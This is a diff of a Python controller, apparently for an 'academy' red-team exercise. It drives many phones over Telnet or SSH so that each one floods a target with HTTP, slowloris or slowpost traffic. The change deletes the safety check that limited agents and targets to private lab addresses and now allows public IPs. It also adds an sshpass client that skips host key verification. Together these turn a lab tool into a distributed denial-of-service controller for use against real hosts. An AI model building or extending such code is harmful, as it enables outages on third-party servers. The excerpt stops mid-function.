@@ -3,47 +3,50 @@ ZYLON FUSION v2.5 - Academy Battle Engine
 ==========================================
 
 WHAT THIS DOES:
-    Telnet-based controller that connects to YOUR phone farm on YOUR local network.
-    You add your phones by IP + port + username + password (same as Telnet login).
+    Controller that connects to YOUR phone farm via Telnet or SSH.
+    You add your phones by IP + port + username + password.
     ZYLON sends HTTP test commands to each phone, phones execute them against YOUR target.
     Blue team students watch the target and try to defend.
 
 HOW IT WORKS (step by step):
-    1. You add agents: "add" → enter IP, port, username, password for each phone
-    2. ZYLON connects to each phone via Telnet (same as you typing in terminal)
+    1. You add agents: "add" -> enter IP, port, username, password for each phone
+    2. ZYLON connects to each phone via Telnet or SSH (auto-detected)
     3. You set target: YOUR DVWA or local server URL
     4. You pick a phase (recon/flood/slowloris/slowpost)
-    5. ZYLON sends curl/nc commands to each phone via Telnet
-    6. Each phone runs the commands → sends HTTP requests to target
+    5. ZYLON sends curl/nc commands to each phone
+    6. Each phone runs the commands -> sends HTTP requests to target
     7. ZYLON collects results (HTTP status codes) from each phone
-    8. Ctrl+C = EMERGENCY STOP → ZYLON sends kill signal to all phones
+    8. Ctrl+C = EMERGENCY STOP -> ZYLON sends kill signal to all phones
 
-SECURITY:
-    - ONLY works on private/local IPs (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
-    - Will REJECT any public IP for agents or targets
-    - All traffic stays on YOUR network
+PROTOCOLS SUPPORTED:
+    - Telnet (port 23): Old school remote terminal, unencrypted
+    - SSH (port 8022): Secure shell, default on Termux (sshd)
+    Auto-detects: If port is 8022 or 22 -> uses SSH, otherwise Telnet
 
 FLOW DIAGRAM:
-    ZYLON (your laptop)
-        │
-        ├── Telnet ──→ Phone 1 (192.168.1.10) ──curl──→ DVWA (192.168.1.100)
-        ├── Telnet ──→ Phone 2 (192.168.1.11) ──curl──→ DVWA (192.168.1.100)
-        ├── Telnet ──→ Phone 3 (192.168.1.12) ──curl──→ DVWA (192.168.1.100)
-        └── Ctrl+C ──→ kills all phones instantly
+    ZYLON (your phone)
+        |
+        |-- SSH/Telnet --> Phone 1 (any IP) --curl--> DVWA (your server)
+        |-- SSH/Telnet --> Phone 2 (any IP) --curl--> DVWA (your server)
+        |-- SSH/Telnet --> Phone 3 (any IP) --curl--> DVWA (your server)
+        +-- Ctrl+C --> kills all phones instantly
 
 TERMUX COMPATIBLE: Yes - auto-detects Termux Android and uses compatible commands
+PYTHON 3.13+ COMPATIBLE: Yes - uses MiniTelnet (socket-based) instead of removed telnetlib
 """
 
 # ============================================================================
 # IMPORTS - What each library does
 # ============================================================================
 
-import telnetlib   # Python's built-in Telnet client - connects to remote terminals
 import socket      # Low-level networking - used for timeout/connection errors
+import select      # I/O multiplexing - used by MiniTelnet for non-blocking reads
 import threading   # Runs multiple tasks at the same time (one thread per phone)
 import time        # Sleep/delays and timestamps
 import json        # JSON data handling
 import random      # Random numbers for cache-busting URL parameters
+import subprocess  # Run SSH commands externally (for MiniSSH)
+import os          # File/path operations
 from datetime import datetime  # Timestamps for battle stats
 
 # Rich library - makes terminal output look pretty with colors, tables, panels
@@ -57,95 +60,564 @@ console = Console()
 
 
 # ============================================================================
-# PRIVATE IP CHECK
+# PORT CHECK UTILITY - Test if a port is open before trying to connect
 # ============================================================================
-# This is the SAFETY GATE - it prevents you from accidentally adding
-# a public IP (like google.com or someone else's server).
-# Only allows IPs on YOUR local network.
+# This is the FIRST thing we do before Telnet/SSH login.
+# It tells us if the phone is even reachable on that port.
+# If this fails, there's no point trying Telnet/SSH login.
 
-def is_private_ip(ip):
+def check_port(host, port, timeout=5):
     """
-    Check if IP address is in private/local range (RFC 1918 standard).
+    Test if a TCP port is open and accepting connections.
     
-    Private IP ranges (these are YOUR internal network IPs):
-        - 10.0.0.0 to 10.255.255.255    (Class A private - big networks)
-        - 172.16.0.0 to 172.31.255.255   (Class B private - medium networks)  
-        - 192.168.0.0 to 192.168.255.255 (Class C private - home/office WiFi)
-        - 127.0.0.0 to 127.255.255.255   (localhost - your own machine)
-    
-    Public IPs like 8.8.8.8, 142.250.x.x etc. will be REJECTED.
+    WHY WE NEED THIS:
+        Before trying Telnet/SSH login, we check if the port is even open.
+        This gives us a much faster and clearer error message:
+        - "Port closed" = no server running on that port
+        - "Port open but login failed" = server is there, wrong credentials
+        - "Host unreachable" = IP is wrong or network issue
     
     HOW IT WORKS:
-        1. Split IP into 4 parts (e.g., "192.168.1.10" → [192, 168, 1, 10])
-        2. Check if first number matches any private range
-        3. Return True (private/safe) or False (public/blocked)
+        1. Create a TCP socket
+        2. Set a timeout (5 seconds default)
+        3. Try to connect to host:port
+        4. If connection succeeds -> port is OPEN (something is listening)
+        5. If timeout -> port is FILTERED (firewall blocking or host unreachable)
+        6. If connection refused -> port is CLOSED (nothing listening there)
     """
     try:
-        parts = ip.split('.')
-        if len(parts) != 4:  # Valid IP must have exactly 4 numbers
-            return False
-        octets = [int(p) for p in parts]
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        result = sock.connect_ex((host, int(port)))
+        sock.close()
         
-        # 10.x.x.x → Used by large private networks
-        if octets[0] == 10:
-            return True
-        
-        # 172.16.x.x to 172.31.x.x → Used by medium private networks
-        if octets[0] == 172 and 16 <= octets[1] <= 31:
-            return True
-        
-        # 192.168.x.x → Most common home/office WiFi range
-        if octets[0] == 192 and octets[1] == 168:
-            return True
-        
-        # 127.x.x.x → Localhost (your own machine)
-        if octets[0] == 127:
-            return True
-            
-    except (ValueError, IndexError):
-        return False
-    return False
+        if result == 0:
+            # Port is OPEN - something is listening there
+            return True, "OPEN"
+        elif result == 111:
+            # Connection refused - port is closed (nothing listening)
+            return False, "CLOSED (nothing listening on that port)"
+        elif result == 113:
+            # No route to host
+            return False, "NO ROUTE (host unreachable - wrong IP or network issue)"
+        else:
+            # Other error
+            return False, f"FILTERED (error code: {result})"
+    except socket.timeout:
+        # Timeout - probably firewall dropping packets
+        return False, "TIMEOUT (port filtered or host unreachable)"
+    except socket.gaierror:
+        # DNS resolution failed (invalid hostname)
+        return False, "DNS FAIL (invalid hostname)"
+    except Exception as e:
+        return False, f"ERROR ({str(e)[:40]})"
 
 
 # ============================================================================
-# TELNET AGENT CLASS - Represents ONE phone in your farm
+# MINI TELNET - Custom socket-based Telnet client
+# ============================================================================
+# WHY THIS EXISTS:
+#   Python 3.13 REMOVED the built-in telnetlib module!
+#   So we built our own MiniTelnet using raw sockets.
+#   Works on Python 3.6+ including 3.12 and 3.13.
+#
+# HOW TELNET WORKS (simplified):
+#   1. Open a TCP connection to the server on port 23
+#   2. Server sends a login prompt: "login: "
+#   3. Client sends username + newline
+#   4. Server sends password prompt: "Password: "
+#   5. Client sends password + newline
+#   6. Server gives a shell prompt: "$ " or "# "
+#   7. Client sends commands, server executes them and returns output
+#
+# TELNET PROTOCOL DETAILS:
+#   - IAC (Interpret As Command): byte 255, starts a Telnet command
+#   - WILL/WONT/DO/DONT: Negotiation of Telnet options
+#   - We handle basic IAC negotiation to prevent the server from
+#     sending us into echo mode or other unwanted states
+
+class MiniTelnet:
+    """
+    Custom socket-based Telnet client. Replaces Python 3.13's removed telnetlib.
+    
+    SUPPORTS:
+        - read_until(delimiter, timeout) - Read until a string appears
+        - write(data) - Send data to the server
+        - close() - Close the connection
+        - Basic IAC negotiation (prevents server from messing up our terminal)
+    
+    LIMITATIONS:
+        - No advanced Telnet option negotiation (we don't need it)
+        - No TLS/SSL support (Telnet is unencrypted anyway)
+    
+    USAGE:
+        tn = MiniTelnet("192.168.1.10", 23, timeout=10)
+        tn.read_until(b"login: ", timeout=5)
+        tn.write(b"admin\n")
+        tn.read_until(b"Password: ", timeout=5)
+        tn.write(b"password\n")
+        tn.read_until(b"$ ", timeout=5)
+        tn.write(b"uname -a\n")
+        output = tn.read_until(b"$ ", timeout=5)
+        tn.close()
+    """
+    
+    # Telnet protocol bytes (IAC = Interpret As Command)
+    IAC  = bytes([255])   # 0xFF - Start of Telnet command
+    DONT = bytes([254])   # 0xFE - Don't do this option
+    DO   = bytes([253])   # 0xFD - Please do this option
+    WONT = bytes([252])   # 0xFC - I won't do this option
+    WILL = bytes([251])   # 0xFB - I will do this option
+    
+    def __init__(self, host, port=23, timeout=10):
+        """
+        Connect to a Telnet server.
+        
+        ARGS:
+            host: IP address or hostname (e.g., "192.168.1.10")
+            port: Telnet port (default 23)
+            timeout: Connection timeout in seconds
+        
+        WHAT HAPPENS:
+            1. Create a TCP socket
+            2. Connect to host:port
+            3. Connection is ready for read_until/write
+        """
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(timeout)
+        self.sock.connect((host, int(port)))
+        self.sock.settimeout(5)  # Set read timeout after connect
+        self._buffer = b""  # Buffer for incoming data
+    
+    def read_until(self, delimiter, timeout=5):
+        """
+        Read data from the server until we see the delimiter string.
+        
+        HOW IT WORKS:
+            1. Check our buffer first (might already have the delimiter)
+            2. If not in buffer, keep reading from socket
+            3. Use select() to wait for data with a timeout
+            4. When delimiter found, return everything up to and including it
+            5. Keep any leftover data in buffer for next read
+        
+        ARGS:
+            delimiter: Bytes to wait for (e.g., b"login: " or b"$ ")
+            timeout: Max seconds to wait
+        
+        RETURNS:
+            All data read up to and including the delimiter
+        
+        EXAMPLE:
+            data = tn.read_until(b"login: ", timeout=5)
+            # data might be: b"\r\nUbuntu login: "
+        """
+        # Check if delimiter is already in our buffer from a previous read
+        if delimiter in self._buffer:
+            idx = self._buffer.index(delimiter) + len(delimiter)
+            result = self._buffer[:idx]
+            self._buffer = self._buffer[idx:]  # Save leftover data
+            return result
+        
+        # Not in buffer - need to read more data from socket
+        end_time = time.time() + timeout
+        
+        while time.time() < end_time:
+            remaining = end_time - time.time()
+            if remaining <= 0:
+                break
+            
+            # select() waits until data is available, with a 1-second check interval
+            # This prevents busy-waiting (wasting CPU while waiting for data)
+            ready, _, _ = select.select([self.sock], [], [], min(1.0, remaining))
+            
+            if ready:
+                try:
+                    chunk = self.sock.recv(4096)  # Read up to 4KB at a time
+                    if not chunk:
+                        # Connection closed by server
+                        break
+                    
+                    # Handle Telnet IAC negotiation commands
+                    chunk = self._negotiate(chunk)
+                    self._buffer += chunk
+                    
+                    # Check if delimiter is now in the buffer
+                    if delimiter in self._buffer:
+                        idx = self._buffer.index(delimiter) + len(delimiter)
+                        result = self._buffer[:idx]
+                        self._buffer = self._buffer[idx:]
+                        return result
+                        
+                except socket.timeout:
+                    continue
+                except Exception:
+                    break
+        
+        # Timeout - return whatever we have
+        result = self._buffer
+        self._buffer = b""
+        return result
+    
+    def write(self, data):
+        """
+        Send data to the Telnet server.
+        
+        Simply sends the bytes over the socket.
+        Usually you send: command + b"\n" (newline = pressing Enter)
+        
+        EXAMPLE:
+            tn.write(b"admin\n")  # Type "admin" and press Enter
+        """
+        self.sock.sendall(data)
+    
+    def close(self):
+        """
+        Close the Telnet connection.
+        Sends a graceful close to the socket.
+        """
+        try:
+            self.sock.shutdown(socket.SHUT_RDWR)
+        except Exception:
+            pass
+        try:
+            self.sock.close()
+        except Exception:
+            pass
+    
+    def _negotiate(self, data):
+        """
+        Handle Telnet IAC (Interpret As Command) negotiation.
+        
+        WHY THIS IS NEEDED:
+            When you connect to a Telnet server, it sends option negotiation
+            commands like "I WILL ECHO" or "I DO SUPPRESS_GO_AHEAD".
+            If we don't respond, the server might hang or behave weirdly.
+        
+        WHAT WE DO:
+            - Respond WONT to all WILL requests (we won't do anything)
+            - Respond DONT to all DO requests (don't ask us to do anything)
+            - This tells the server: "Just give me a plain terminal, no fancy options"
+        
+        TELNET COMMAND FORMAT:
+            IAC (255) + COMMAND (251-254) + OPTION (1 byte)
+            Example: 255 251 1 = "I WILL ECHO"
+            Our response: 255 252 1 = "I WON'T ECHO"
+        """
+        result = b""
+        i = 0
+        while i < len(data):
+            if data[i:i+1] == self.IAC:
+                if i + 2 < len(data):
+                    cmd = data[i+1:i+2]
+                    opt = data[i+2:i+3]
+                    
+                    if cmd == self.WILL:
+                        # Server says "I will do X" -> respond "Don't"
+                        self.sock.sendall(self.IAC + self.DONT + opt)
+                    elif cmd == self.DO:
+                        # Server says "Please do X" -> respond "I won't"
+                        self.sock.sendall(self.IAC + self.WONT + opt)
+                    elif cmd == self.WONT or cmd == self.DONT:
+                        # Server says "I won't do X" or "Don't do X" - OK, noted
+                        pass
+                    
+                    i += 3  # Skip IAC + CMD + OPT (3 bytes)
+                else:
+                    i += 1
+            else:
+                # Normal data byte - keep it
+                result += data[i:i+1]
+                i += 1
+        
+        return result
+
+
+# ============================================================================
+# MINI SSH - Subprocess-based SSH client for Termux
+# ============================================================================
+# WHY THIS EXISTS:
+#   Most Termux phones run `sshd` (SSH server), NOT Telnet server.
+#   SSH is the standard way to remotely access Termux phones.
+#   Default SSH port on Termux is 8022 (not 22, because port 22 needs root).
+#
+# HOW IT WORKS:
+#   Instead of using a Python SSH library (paramiko - hard to install on Termux),
+#   we just call the `sshpass` or `ssh` command directly via subprocess.
+#   This is simpler and works on any system that has SSH installed.
+#
+# REQUIREMENTS ON THE CONTROLLER (your phone running ZYLON):
+#   - `sshpass` package (for auto-password login): pkg install sshpass
+#   - OR `ssh` with key-based auth (no password needed)
+#
+# REQUIREMENTS ON THE AGENT PHONES (your phone farm):
+#   - `openssh` package installed: pkg install openssh
+#   - SSH server running: sshd
+#   - Default Termux SSH port: 8022
+
+class MiniSSH:
+    """
+    SSH client using subprocess (calls sshpass/ssh command).
+    
+    WHY SUBPROCESS INSTEAD OF PARAMIKO:
+        - paramiko is hard to install on Termux (C dependencies fail)
+        - sshpass is a simple apt/pkg install
+        - subprocess + sshpass works everywhere
+    
+    USAGE:
+        ssh = MiniSSH("192.168.1.10", 8022, "admin", "mypassword")
+        ssh.connect()
+        output = ssh.execute("uname -a")
+        ssh.close()
+    """
+    
+    def __init__(self, host, port=8022, username="admin", password="admin"):
+        self.host = host
+        self.port = int(port)
+        self.username = username
+        self.password = password
+        self.connected = False
+        self._sshpass_available = False  # Will be checked on connect
+    
+    def connect(self, timeout=10):
+        """
+        Test SSH connection by running a simple command.
+        
+        HOW IT WORKS:
+            1. Check if `sshpass` is installed (needed for password auth)
+            2. Try to run `echo test` on the remote server via SSH
+            3. If it works -> connected! 
+            4. If not -> return the error
+        
+        COMMAND USED:
+            sshpass -p 'PASSWORD' ssh -p PORT -o StrictHostKeyChecking=no USER@HOST 'echo ZYLON_OK'
+        
+        FLAGS:
+            -o StrictHostKeyChecking=no  = Don't ask to confirm host key
+            -o UserKnownHostsFile=/dev/null = Don't save host key
+            -o ConnectTimeout=10        = Connection timeout in seconds
+        """
+        # Check if sshpass is available
+        try:
+            result = subprocess.run(
+                ['which', 'sshpass'], 
+                capture_output=True, timeout=3
+            )
+            self._sshpass_available = (result.returncode == 0)
+        except Exception:
+            self._sshpass_available = False
+        
+        if not self._sshpass_available:
+            # Try without sshpass (key-based auth)
+            return self._connect_key(timeout)
+        
+        # Use sshpass for password authentication
+        return self._connect_sshpass(timeout)
+    
+    def _connect_sshpass(self, timeout=10):
+        """Connect using sshpass (password-based SSH auth)"""
+        try:
+            cmd = [
+                'sshpass', '-p', self.password,
+                'ssh',
+                '-p', str(self.port),
+                '-o', 'StrictHostKeyChecking=no',
+                '-o', 'UserKnownHostsFile=/dev/null',
+                '-o', f'ConnectTimeout={timeout}',
+                '-o', 'LogLevel=ERROR',
+                f'{self.username}@{self.host}',
+                'echo ZYLON_SSH_OK'
+            ]
+            
+            result = subprocess.run(
+                cmd, capture_output=True, timeout=timeout + 5,
+                text=True
+            )
+            
+            if 'ZYLON_SSH_OK' in result.stdout:
+                self.connected = True
+                return True, "SSH Connected (sshpass)"
+            elif 'Permission denied' in result.stderr:
+                return False, "SSH Auth failed (wrong password)"
+            elif 'Connection refused' in result.stderr:
+                return False, "SSH Connection refused (sshd not running?)"
+            elif 'timed out' in result.stderr.lower() or result.returncode == 255:
+                return False, "SSH Connection timeout"
+            else:
+                return False, f"SSH Error: {result.stderr[:60]}"
+                
+        except subprocess.TimeoutExpired:
+            return False, "SSH Connection timeout"
+        except FileNotFoundError:
+            return False, "sshpass not installed (run: pkg install sshpass)"
+        except Exception as e:
+            return False, f"SSH Error: {str(e)[:50]}"
+    
+    def _connect_key(self, timeout=10):
+        """Connect using SSH key (no password needed)"""
+        try:
+            cmd = [
+                'ssh',
+                '-p', str(self.port),
+                '-o', 'StrictHostKeyChecking=no',
+                '-o', 'UserKnownHostsFile=/dev/null',
+                '-o', f'ConnectTimeout={timeout}',
+                '-o', 'LogLevel=ERROR',
+                '-o', 'BatchMode=yes',  # Don't ask for password
+                f'{self.username}@{self.host}',
+                'echo ZYLON_SSH_OK'
+            ]
+            
+            result = subprocess.run(
+                cmd, capture_output=True, timeout=timeout + 5,
+                text=True
+            )
+            
+            if 'ZYLON_SSH_OK' in result.stdout:
+                self.connected = True
+                return True, "SSH Connected (key auth)"
+            elif 'Permission denied' in result.stderr:
+                return False, "SSH Auth failed (no key, install sshpass for password auth)"
+            elif 'Connection refused' in result.stderr:
+                return False, "SSH Connection refused"
+            else:
+                return False, f"SSH Error: {result.stderr[:60]}"
+                
+        except subprocess.TimeoutExpired:
+            return False, "SSH Connection timeout"
+        except Exception as e:
+            return False, f"SSH Error: {str(e)[:50]}"
+    
+    def execute(self, command, timeout=60):
+        """
+        Run a shell command on the remote server via SSH and get the output.
+        
+        HOW IT WORKS:
+            1. Build an SSH command string
+            2. Run it via subprocess
+            3. Return the stdout output
+        
+        EXAMPLE:
+            success, output = ssh.execute("curl -s http://target.com")
+            # output = "200 200 403 ..."
+        """
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            if self._sshpass_available:
+                cmd = [
+                    'sshpass', '-p', self.password,
+                    'ssh',
+                    '-p', str(self.port),
+                    '-o', 'StrictHostKeyChecking=no',
+                    '-o', 'UserKnownHostsFile=/dev/null',
+                    '-o', 'LogLevel=ERROR',
+                    f'{self.username}@{self.host}',
+                    command
+                ]
+            else:
+                cmd = [
+                    'ssh',
+                    '-p', str(self.port),
+                    '-o', 'StrictHostKeyChecking=no',
+                    '-o', 'UserKnownHostsFile=/dev/null',
+                    '-o', 'LogLevel=ERROR',
+                    '-o', 'BatchMode=yes',
+                    f'{self.username}@{self.host}',
+                    command
+                ]
+            
+            result = subprocess.run(
+                cmd, capture_output=True, timeout=timeout,
+                text=True
+            )
+            
+            return True, result.stdout
+            
+        except subprocess.TimeoutExpired:
+            return False, "Command timeout"
+        except Exception as e:
+            return False, f"Exec error: {str(e)[:40]}"
+    
+    def send_stop(self):
+        """
+        EMERGENCY STOP - Kill processes on the remote server.
+        
+        Runs pkill to kill any curl/wget processes that ZYLON started.
+        This is different from Telnet's Ctrl+C approach.
+        With SSH, we send a kill command instead of an interrupt signal.
+        """
+        if not self.connected:
+            return
+        try:
+            self.execute(
+                "pkill -f 'curl.*zylon' 2>/dev/null; "
+                "pkill -f 'curl.*ZYLONAcademy' 2>/dev/null; "
+                "pkill -f 'wget.*zylon' 2>/dev/null; "
+                "pkill -f 'nc.*zylon' 2>/dev/null",
+                timeout=10
+            )
+        except Exception:
+            pass
+    
+    def close(self):
+        """
+        Close SSH connection.
+        With subprocess SSH, each command is a separate connection,
+        so there's no persistent connection to close.
+        Just mark as disconnected.
+        """
+        self.send_stop()
+        self.connected = False
+
+
+# ============================================================================
+# AGENT CLASS - Represents ONE phone in your farm
 # ============================================================================
 # 
 # Each phone in your farm is represented by a TelnetAgent object.
 # When you "add" a phone, ZYLON creates a TelnetAgent for it.
-# When you "connect", it logs into the phone via Telnet (like SSH but simpler).
+# When you "connect", it logs into the phone via Telnet or SSH.
 # When you run a phase, it sends commands to the phone.
 #
-# TELNET BASICS:
-#   - Telnet is an old protocol for remote terminal access (like SSH but unencrypted)
-#   - Your phones run a Telnet server (sshd with telnet enabled or busybox telnetd)
-#   - ZYLON connects as a client, logs in, and types commands
-#   - It's like you sitting at each phone and typing curl commands manually
+# AUTO-DETECT PROTOCOL:
+#   - Port 22 or 8022 -> SSH (MiniSSH)
+#   - Any other port (23, etc.) -> Telnet (MiniTelnet)
+#   This is because Termux SSH runs on 8022 by default.
 
 class TelnetAgent:
     """
-    Represents a single phone agent connected via Telnet.
+    Represents a single phone agent connected via Telnet or SSH.
     
     Each agent stores:
-        - host: Phone's IP address (e.g., 192.168.1.10)
-        - port: Telnet port (usually 23 for standard Telnet)
+        - host: Phone's IP address (e.g., 192.168.1.10 or any public IP)
+        - port: Connection port (8022 for SSH, 23 for Telnet)
         - username: Login username (e.g., "admin")
         - password: Login password
+        - protocol: "ssh" or "telnet" (auto-detected from port number)
         - connected: Whether we're currently logged in
         - os_type: "termux" (Android) or "linux" (determines which commands to use)
     """
     
     def __init__(self, host, port, username, password, agent_id=0):
         # Connection details - you provide these when adding an agent
-        self.host = host              # Phone's IP on your local network
-        self.port = port              # Telnet port (23 is default)
-        self.username = username      # Telnet login username
-        self.password = password      # Telnet login password
+        self.host = host              # Phone's IP (any network - local or public)
+        self.port = int(port)         # Connection port
+        self.username = username      # Login username
+        self.password = password      # Login password
         self.agent_id = agent_id      # Auto-assigned number (1, 2, 3...)
+        
+        # Auto-detect protocol from port number
+        # Port 22 = standard SSH, Port 8022 = Termux SSH
+        # Any other port = assume Telnet
+        if self.port in [22, 8022]:
+            self.protocol = "ssh"
+        else:
+            self.protocol = "telnet"
         
         # State tracking
         self.connected = False        # Are we currently logged into this phone?
-        self.tn = None               # The actual Telnet connection object
+        self.conn = None              # The connection object (MiniTelnet or MiniSSH)
         self.os_type = None          # 'termux' or 'linux' - auto-detected after login
         self.busy = False            # Is this phone currently running commands?
         self.requests_sent = 0       # How many requests this phone has sent
@@ -153,94 +625,200 @@ class TelnetAgent:
     
     def connect(self, timeout=10):
         """
-        Connect to this phone via Telnet and log in.
+        Connect to this phone and log in.
         
         STEP BY STEP:
-            1. Create Telnet connection to host:port
-            2. Wait for "login: " prompt
-            3. Type the username + Enter
-            4. Wait for "Password: " prompt
-            5. Type the password + Enter
-            6. Wait for shell prompt ($ or #)
-            7. If we get a shell → connected! Auto-detect OS type.
-            8. If timeout or auth fails → mark as failed
+            1. First check if the port is even open (quick diagnostic)
+            2. Based on protocol (SSH or Telnet), use the right client
+            3. SSH: Use MiniSSH (subprocess + sshpass)
+            4. Telnet: Use MiniTelnet (socket-based)
+            5. Auto-detect OS type (Termux/Android vs Linux)
+            6. Return success or a helpful error message
+        
+        PORT CHECK:
+            We check the port FIRST before trying to log in.
+            If the port is closed, there's no point trying credentials.
+            This gives you a clear error: "Port closed" vs "Auth failed"
+        """
+        # Step 0: Quick port check - is anything even listening?
+        port_open, port_msg = check_port(self.host, self.port, timeout=5)
+        if not port_open:
+            self.last_status = f"Port {port_msg}"
+            return False, f"Port {self.port} is {port_msg}"
+        
+        # Step 1: Connect using the right protocol
+        if self.protocol == "ssh":
+            return self._connect_ssh(timeout)
+        else:
+            return self._connect_telnet(timeout)
+    
+    def _connect_ssh(self, timeout=10):
+        """
+        Connect via SSH using MiniSSH.
+        
+        MiniSSH uses subprocess to call sshpass/ssh command.
+        No telnetlib dependency needed.
+        """
+        try:
+            self.conn = MiniSSH(self.host, self.port, self.username, self.password)
+            success, msg = self.conn.connect(timeout=timeout)
+            
+            if success:
+                self.connected = True
+                self.last_status = "Connected (SSH)"
+                
+                # Auto-detect OS type
+                ok, output = self.conn.execute("uname -a 2>/dev/null || echo TERMUX_ANDROID", timeout=10)
+                if ok:
+                    if "android" in output.lower() or "TERMUX" in output:
+                        self.os_type = "termux"
+                    else:
+                        self.os_type = "linux"
+                else:
+                    self.os_type = "linux"  # Default assumption
+                
+                return True, msg
+            else:
+                self.last_status = f"SSH {msg}"
+                return False, msg
+                
+        except Exception as e:
+            self.last_status = f"Error: {str(e)[:30]}"
+            return False, str(e)[:50]
+    
+    def _connect_telnet(self, timeout=10):
+        """
+        Connect via Telnet using MiniTelnet (socket-based).
         
         This is exactly what happens when YOU open a terminal and type:
             $ telnet 192.168.1.10
             login: admin
             Password: ****
             $ _
+        
+        STEP BY STEP:
+            1. Create MiniTelnet connection to host:port
+            2. Wait for "login: " prompt
+            3. Type the username + Enter
+            4. Wait for "Password: " prompt
+            5. Type the password + Enter
+            6. Wait for shell prompt ($ or #)
+            7. If we get a shell -> connected! Auto-detect OS type.
+            8. If timeout or auth fails -> mark as failed
         """
         try:
             # Step 1: Open Telnet connection
-            self.tn = telnetlib.Telnet(self.host, self.port, timeout=timeout)
+            self.conn = MiniTelnet(self.host, self.port, timeout=timeout)
             
             # Step 2: Wait for login prompt (most Telnet servers show "login: ")
-            self.tn.read_until(b"login: ", timeout=5)
+            # Some servers might show "Login:" or "login:" - case insensitive
+            initial = self.conn.read_until(b"login: ", timeout=5)
+            
+            # If we didn't get "login:", try "Login:" or just proceed
+            if b"login:" not in initial.lower() and b"$ " not in initial and b"# " not in initial:
+                # Maybe auto-login or different prompt, try reading a bit more
+                extra = self.conn.read_until(b": ", timeout=3)
+                initial += extra
+            
+            # If already at a shell prompt (no login needed)
+            if b"$ " in initial or b"# " in initial:
+                self.connected = True
+                self.last_status = "Connected (Telnet, auto-login)"
+                self._detect_os()
+                return True, "Connected (auto-login)"
+            
             # Step 3: Send username
-            self.tn.write(self.username.encode() + b"\n")
+            self.conn.write(self.username.encode() + b"\n")
             
             # Step 4: Wait for password prompt
-            self.tn.read_until(b"Password: ", timeout=5)
+            self.conn.read_until(b"assword: ", timeout=5)
+            
             # Step 5: Send password
-            self.tn.write(self.password.encode() + b"\n")
+            self.conn.write(self.password.encode() + b"\n")
             
             # Step 6: Wait for shell prompt ($ for normal user, # for root)
-            response = self.tn.read_until(b"$ ", timeout=5)
+            response = self.conn.read_until(b"$ ", timeout=8)
+            
+            # Check for common failure indicators
+            combined = initial + response
+            if b"Login incorrect" in combined or b"Authentication failure" in combined:
+                self.last_status = "Auth failed"
+                self.conn.close()
+                return False, "Authentication failed (wrong username/password)"
+            
             if b"$ " in response or b"# " in response:
                 # Login successful!
                 self.connected = True
-                self.last_status = "Connected"
-                
-                # Step 7: Auto-detect what OS the phone is running
-                # This matters because Termux Android uses slightly different commands
-                self.tn.write(b"uname -a 2>/dev/null || echo TERMUX_ANDROID\n")
-                resp = self.tn.read_until(b"$ ", timeout=5).decode('utf-8', errors='ignore')
-                if "TERMUX" in resp or "android" in resp.lower():
-                    self.os_type = "termux"   # Android phone with Termux
-                else:
-                    self.os_type = "linux"    # Standard Linux
-                
+                self.last_status = "Connected (Telnet)"
+                self._detect_os()
                 return True, "Connected"
             else:
-                # Login failed - wrong username/password
-                self.last_status = "Auth failed"
-                return False, "Authentication failed"
+                # Try waiting a bit more for the prompt
+                extra = self.conn.read_until(b"$ ", timeout=3)
+                if b"$ " in extra or b"# " in extra:
+                    self.connected = True
+                    self.last_status = "Connected (Telnet)"
+                    self._detect_os()
+                    return True, "Connected"
+                else:
+                    # Login failed - wrong username/password or no shell
+                    self.last_status = "Auth failed"
+                    self.conn.close()
+                    return False, "Authentication failed (no shell prompt received)"
                 
         except socket.timeout:
-            # Phone didn't respond - might be off or wrong IP
             self.last_status = "Timeout"
             return False, "Connection timeout"
         except ConnectionRefusedError:
-            # Phone refused connection - Telnet not running on that port
             self.last_status = "Refused"
-            return False, "Connection refused"
+            return False, "Connection refused (no Telnet server on this port)"
         except Exception as e:
-            # Any other error
             self.last_status = f"Error: {str(e)[:30]}"
             return False, str(e)[:50]
     
-    def execute(self, command, timeout=10):
+    def _detect_os(self):
+        """Auto-detect if the phone is running Termux or standard Linux"""
+        try:
+            if self.protocol == "ssh":
+                ok, output = self.conn.execute("uname -a 2>/dev/null || echo TERMUX_ANDROID", timeout=5)
+                if ok and ("android" in output.lower() or "TERMUX" in output):
+                    self.os_type = "termux"
+                else:
+                    self.os_type = "linux"
+            else:
+                # Telnet
+                self.conn.write(b"uname -a 2>/dev/null || echo TERMUX_ANDROID\n")
+                resp = self.conn.read_until(b"$ ", timeout=5).decode('utf-8', errors='ignore')
+                if "TERMUX" in resp or "android" in resp.lower():
+                    self.os_type = "termux"
+                else:
+                    self.os_type = "linux"
+        except Exception:
+            self.os_type = "linux"  # Default assumption
+    
+    def execute(self, command, timeout=60):
         """
         Run a shell command on this phone and get the output.
         
         HOW IT WORKS:
-            1. Send the command string + newline (like pressing Enter)
-            2. Read everything until we see the shell prompt ($ ) again
-            3. The text between is the command output
+            - SSH: Each command is a separate SSH session (subprocess)
+            - Telnet: Send command over the persistent connection
         
-        Example: If we send "curl -s http://target.com", 
-        we get back something like "200 OK..." then the prompt.
+        Returns: (success_bool, output_string)
         """
-        if not self.connected or not self.tn:
+        if not self.connected or not self.conn:
             return False, "Not connected"
         
         try:
-            # Send command (encode string to bytes, add newline)
-            self.tn.write(command.encode() + b"\n")
-            # Read until shell prompt appears (means command finished)
-            response = self.tn.read_until(b"$ ", timeout=timeout)
-            return True, response.decode('utf-8', errors='ignore')
+            if self.protocol == "ssh":
+                # SSH: Each command is a new subprocess call
+                return self.conn.execute(command, timeout=timeout)
+            else:
+                # Telnet: Send over persistent connection
+                self.conn.write(command.encode() + b"\n")
+                # Read until shell prompt appears (means command finished)
+                response = self.conn.read_until(b"$ ", timeout=timeout)
+                return True, response.decode('utf-8', errors='ignore')
         except Exception as e:
             self.last_status = f"Exec error: {str(e)[:20]}"
             return False, str(e)[:50]
@@ -250,26 +828,23 @@ class TelnetAgent:
         EMERGENCY STOP - Kill whatever this phone is doing.
         
         HOW IT WORKS:
-            1. Send Ctrl+C (\x03) - this interrupts the running command
-            2. Send it twice for good measure (some programs need double Ctrl+C)
-            3. Also run pkill to kill any leftover curl/wget processes
-            4. This ensures the phone stops IMMEDIATELY
